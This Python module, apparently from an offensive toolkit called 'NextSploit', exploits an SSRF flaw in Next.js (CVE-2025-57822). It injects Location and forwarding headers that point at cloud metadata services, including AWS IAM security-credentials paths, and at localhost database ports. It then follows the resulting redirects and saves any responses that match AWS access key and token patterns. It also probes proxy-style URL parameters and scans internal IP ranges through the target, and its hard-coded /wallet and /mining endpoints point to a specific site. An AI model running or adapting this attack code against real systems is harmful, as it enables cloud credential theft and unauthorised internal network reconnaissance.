#!/usr/bin/env python3
"""
NextSploit — CVE-2025-57822: Server-Side Request Forgery (SSRF) v2

Key improvements over v1:
  - Baseline comparison per endpoint — eliminates false positives
  - Context-aware keyword matching (strips GTM/analytics <script> tags)
  - AWS IMDS & internal service pattern detection
  - /wallet anomaly elevated tracking
  - GCP metadata endpoint added

Affected: Next.js < 14.2.32
"""

import os
import re
import hashlib
import requests
import concurrent.futures

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, log_status, print_module_header, print_finding,
    create_progress,
)

CVE_ID = "CVE-2025-57822"
CVE_INFO = CVE_DATABASE[CVE_ID]

HEADER_PAYLOADS = [
    # Cloud metadata — highest priority
    {"Location": "http://169.254.169.254/latest/meta-data/"},
    {"Location": "http://169.254.169.254/latest/user-data/"},
    {"Location": "http://169.254.169.254/latest/iam/security-credentials/"},
    {"Location": "http://100.100.100.200/latest/meta-data/"},        # Alibaba Cloud
    {"Location": "http://metadata.google.internal/computeMetadata/v1/"},  # GCP
    # Localhost services
    {"Location": "http://127.0.0.1:3000/"},
    {"Location": "http://127.0.0.1:8080/"},
    {"Location": "http://127.0.0.1:8443/"},
    {"Location": "http://127.0.0.1:9200/"},
    {"Location": "http://127.0.0.1:6379/"},
    {"Location": "http://127.0.0.1:3306/"},
    {"Location": "http://127.0.0.1:5432/"},
    {"Location": "http://127.0.0.1:27017/"},
    {"Location": "http://localhost:3000/_next/data"},
    # Header injection
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/_next/data"},
    {"X-Real-IP": "127.0.0.1"},
    {"next-url": "http://127.0.0.1:3000/api/admin"},
    {"Location": "/_next/data/latest.json"},
]

SSRF_ENDPOINTS = [
    "/", "/api", "/es", "/pt", "/cryptopedia",
    "/mining", "/wallet", "/account", "/dashboard",
    "/_next/data/", "/api/auth/session",
]

PARAM_SSRF_ENDPOINTS = [
    "/api/avatar?url=", "/api/image?url=", "/api/proxy?url=",
    "/api/fetch?url=", "/api/redirect?url=", "/api/webhook?url=",
    "/api/callback?url=", "/api/import?url=",
]

INTERNAL_RANGES = [
    "10.0.0.{}", "10.10.0.{}", "10.20.0.{}",
    "172.16.0.{}", "172.31.0.{}",
    "192.168.0.{}", "192.168.1.{}",
]

INTERNAL_PORTS = [80, 443, 3000, 3001, 4000, 5000, 8000, 8080, 8443, 9000, 9200, 6379, 5432, 3306]

# High-confidence IMDS/internal service fingerprints
IMDS_PATTERNS = [
    r'ami-[0-9a-f]{8,17}',
    r'"AccessKeyId"\s*:',
    r'"SecretAccessKey"\s*:',
    r'"Token"\s*:\s*"[A-Za-z0-9/+=]{50,}',
    r'iam/security-credentials/[A-Za-z0-9\-]+',
    r'computeMetadata',
    r'redis_version',
    r'"cluster_name"\s*:',
    r'"version"\s*:\s*\{"number"',
    r'\+OK\r\n',
    r'EHLO|250-PIPELINING',
]

SCRIPT_TAG_RE = re.compile(r'<script[^>]*>.*?</script>', re.DOTALL | re.IGNORECASE)
SENSITIVE_KEYWORDS_STRICT = ["secretAccessKey", "AccessKeyId", "ami-", "redis_version"]
SENSITIVE_KEYWORDS_GENERAL = ["secret", "admin", "internal", "token", "key", "password", "private", "flag", "credential"]

INTERNAL_HOSTS = ["127.0.0.1", "localhost", "169.254", "0.0.0.0", "10.", "172.16", "192.168", "100.100.100.200", "metadata.google"]


def _hash(text: str) -> str:
    return hashlib.md5(text.encode(errors="ignore")).hexdigest()


def _strip_scripts(html: str) -> str:
    return SCRIPT_TAG_RE.sub("", html)


def _is_imds_response(text: str) -> tuple:
    for pat in IMDS_PATTERNS:
        if re.search(pat, text, re.IGNORECASE):
            return True, pat
    return False, ""


def _find_keywords(text: str) -> list:
    found = []
    for kw in SENSITIVE_KEYWORDS_STRICT:
        if kw.lower() in text.lower():
            found.append(kw)
    stripped = _strip_scripts(text)
    for kw in SENSITIVE_KEYWORDS_GENERAL:
        if kw.lower() in stripped.lower() and kw not in found:
            found.append(kw)
    return found


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2025-57822 (SSRF).
    Phase 1: Baseline collection
    Phase 2: Header injection with diff analysis
    Phase 3: Parameter-based SSRF
    Phase 4: Internal network scan (verbose)
    """
    result = ModuleResult(
        cve=CVE_ID, title=CVE_INFO["title"],
        severity=CVE_INFO["severity"], status="NOT VULNERABLE",
    )
    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")
    os.makedirs("reports", exist_ok=True)

    # ── Phase 1: Baseline ────────────────────────────────────────────────
    log_info("[Phase 1] Collecting baseline responses per endpoint...")
    baselines = {}
    for endpoint in SSRF_ENDPOINTS:
        try:
            r = session.get(f"{target}{endpoint}", timeout=config.timeout, allow_redirects=False)
            baselines[endpoint] = {
                "hash": _hash(r.text), "status": r.status_code,
                "size": len(r.text), "location": r.headers.get("Location", ""),
            }
            log_debug(f"Baseline [{r.status_code}] {endpoint} — {len(r.text)} bytes")
        except requests.RequestException:
            baselines[endpoint] = {"hash": "", "status": 0, "size": 0, "location": ""}

    # ── Phase 2: Header Injection with Diff Analysis ─────────────────────
    log_info("[Phase 2] Header injection SSRF (baseline diff analysis)...")
    total = len(SSRF_ENDPOINTS) * len(HEADER_PAYLOADS)

    with create_progress() as progress:
        task = progress.add_task("Header SSRF Scan", total=total)

        for endpoint in SSRF_ENDPOINTS:
            baseline = baselines.get(endpoint, {})

            for payload in HEADER_PAYLOADS:
                progress.update(task, advance=1)
                hkey = list(payload.keys())[0]
                hval = payload[hkey]

                try:
                    r = session.get(
                        f"{target}{endpoint}", headers=payload,
                        timeout=config.timeout, allow_redirects=False,
                    )
                    log_trace(f"[{r.status_code}] {endpoint} | {hkey}: {hval}")

                    # Check 1: Redirect to internal
                    if r.status_code in (301, 302, 307, 308):
                        loc = r.headers.get("Location", "")
                        is_internal = any(x in loc for x in INTERNAL_HOSTS)
                        is_new = loc != baseline.get("location", "")
                        if is_internal and is_new:
                            detail = f"SSRF internal redirect: {loc} via {hkey} on {endpoint}"
                            log_critical(detail)
                            evidence = {
                                "endpoint": endpoint,
                                "header": f"{hkey}: {hval}",
                                "redirect_location": loc,
                                "status_code": r.status_code,
                                "baseline_location": baseline.get("location", ""),
                            }
                            sev = "HIGH"
                            try:
                                r2 = session.get(loc, timeout=config.timeout)
                                evidence["redirect_status"] = r2.status_code
                                evidence["redirect_size"] = f"{len(r2.text)} bytes"
                                imds_hit, imds_pat = _is_imds_response(r2.text)
                                if imds_hit:
                                    sev = "CRITICAL"
                                    evidence["imds_pattern"] = imds_pat
                                    evidence["preview"] = r2.text[:500]
                                else:
                                    evidence["preview"] = r2.text[:300]
                            except Exception:
                                pass
                            print_finding(CVE_ID, detail, evidence)
                            result.add_finding(Finding(
                                cve=CVE_ID, severity=sev,
                                title="SSRF Internal Redirect",
                                status="VULNERABLE", detail=detail, evidence=evidence,
                            ))
                        elif not is_internal:
                            log_debug(f"Redirect to: {loc} (external)")

                    # Check 2: 200 with diff analysis
                    elif r.status_code == 200 and len(r.text) > 100:
                        resp_hash = _hash(r.text)
                        base_size = baseline.get("size", 0)
                        size_diff = abs(len(r.text) - base_size)

                        if resp_hash == baseline.get("hash", ""):
                            log_trace(f"Identical to baseline: {endpoint}|{hkey}")
                            continue  # No diff → not interesting

                        imds_hit, imds_pat = _is_imds_response(r.text)
                        keywords = _find_keywords(r.text)

                        if imds_hit:
                            detail = f"IMDS data in response via {hkey} on {endpoint} (pattern: {imds_pat})"
                            log_critical(detail)
                            sev = "CRITICAL"
                        elif keywords and size_diff > 200:
                            detail = (
                                f"Response differs from baseline via {hkey} on {endpoint} "
                                f"(size diff: {size_diff}, keywords: {', '.join(keywords[:3])})"
                            )
                            log_warning(detail)
                            sev = "HIGH"
                        else:
                            if config.verbosity >= 2:
                                log_debug(f"Low-confidence diff: {endpoint}|{hkey} (diff={size_diff})")
                            continue

                        evidence = {
                            "endpoint": endpoint,
                            "header": f"{hkey}: {hval}",
                            "keywords_found": keywords,
                            "response_size": f"{len(r.text)} bytes",
                            "baseline_size": f"{base_size} bytes",
                            "size_diff": f"{size_diff} bytes",
                            "preview": r.text[:500],
                        }
                        if imds_hit:
                            evidence["imds_pattern"] = imds_pat

                        fname = f"reports/ssrf_{endpoint.replace('/', '_')}_{hkey}.html"
                        try:
                            with open(fname, "w", errors="ignore") as f:
                                f.write(r.text)
                            evidence["saved_to"] = fname
                        except Exception:
                            pass

                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity=sev,
                            title="SSRF-Induced Response Difference",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))

                    # Check 3: /wallet anomaly
                    elif endpoint == "/wallet" and r.status_code != baseline.get("status", -1):
                        detail = f"/wallet status changed: {baseline.get('status')} → {r.status_code} via {hkey}"
                        log_warning(f"[ANOMALY] {detail}")
                        evidence = {
                            "endpoint": "/wallet",
                            "header": f"{hkey}: {hval}",
                            "baseline_status": baseline.get("status"),
                            "new_status": r.status_code,
                            "note": "/wallet shows anomalous 7120-byte response",
                        }
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="HIGH",
                            title="/wallet SSRF Anomaly",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))

                except requests.RequestException as e:
                    log_trace(f"Error {endpoint}|{hkey}: {e}")

    # ── Phase 3: Parameter-based SSRF ────────────────────────────────────
    log_info("[Phase 3] Parameter-based SSRF endpoint discovery...")
    ssrf_test_url = "http://127.0.0.1:80/"
    with create_progress() as progress:
        task = progress.add_task("Param SSRF Probe", total=len(PARAM_SSRF_ENDPOINTS))
        for param_ep in PARAM_SSRF_ENDPOINTS:
            progress.update(task, advance=1)
            url = f"{target}{param_ep}{ssrf_test_url}"
            try:
                r = session.get(url, timeout=config.timeout, allow_redirects=False)
                log_trace(f"[{r.status_code}] {param_ep}")
                if r.status_code == 200 and len(r.text) > 50:
                    detail = f"SSRF param endpoint responds: {param_ep} (status 200, {len(r.text)} bytes)"
                    log_warning(detail)
                    evidence = {"endpoint": param_ep, "test_url": ssrf_test_url, "response_size": f"{len(r.text)} bytes"}
                    print_finding(CVE_ID, detail, evidence)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="HIGH", title="Parameter-based SSRF Endpoint",
                        status="VULNERABLE", detail=detail, evidence=evidence,
                    ))
            except requests.RequestException:
                pass

    # ── Phase 4: Internal Network Scan ───────────────────────────────────
    if config.verbosity >= 1:
        log_info("[Phase 4] Internal network scan (verbose mode)...")
        _scan_internal_network(config, session, target, result)
    else:
        log_info("[Phase 4] Skipped internal network scan (use -v to enable)")

    if result.finding_count > 0:
        log_critical(f"Found {result.finding_count} SSRF indicators")
    else:
        log_success("No SSRF vulnerabilities detected (baseline comparison active)")

    return result


def _scan_internal_network(config, session, target, result):
    """Scan internal network ranges via SSRF."""
    log_info("Scanning localhost ports...")
    for port in [80, 3000, 3001, 4000, 5000, 8080, 8443, 9200, 6379, 5432, 3306, 27017]:
        for ip in ["127.0.0.1", "0.0.0.0"]:
            url = f"http://{ip}:{port}"
            try:
                r = session.get(target, headers={"Location": url, "X-Forwarded-For": ip},
                    timeout=min(config.timeout, 5), allow_redirects=False)
                if r.status_code in (301, 302, 307, 308):
                    loc = r.headers.get("Location", "")
                    if ip in loc or str(port) in loc:
                        log_warning(f"Internal redirect via {ip}:{port} → {loc}")
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="HIGH", title="Internal Service Access",
                            status="VULNERABLE", detail=f"Redirect to {ip}:{port}",
                            evidence={"ip": ip, "port": port, "redirect": loc},
                        ))
            except Exception:
                pass

    log_info("Scanning internal network ranges (limited)...")

    def _probe(ip, port):
        try:
            r = session.get(target, headers={"Location": f"http://{ip}:{port}", "X-Forwarded-For": ip},
                timeout=min(config.timeout, 5), allow_redirects=False)
            if r.status_code in (301, 302):
                loc = r.headers.get("Location", "")
                if ip in loc:
                    return (ip, port, loc)
        except Exception:
            pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as ex:
        futures = [
            ex.submit(_probe, INTERNAL_RANGES[ri].format(i), INTERNAL_PORTS[pi])
            for ri in range(min(3, len(INTERNAL_RANGES)))
            for i in range(1, 11)
            for pi in range(min(5, len(INTERNAL_PORTS)))
        ]
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            if res:
                ip, port, loc = res
                log_critical(f"Internal service: {ip}:{port} → {loc}")
                result.add_finding(Finding(
                    cve=CVE_ID, severity="HIGH", title="Internal Network Service",
                    status="VULNERABLE", detail=f"Internal service accessible: {ip}:{port}",
                    evidence={"ip": ip, "port": port, "redirect": loc},
                ))
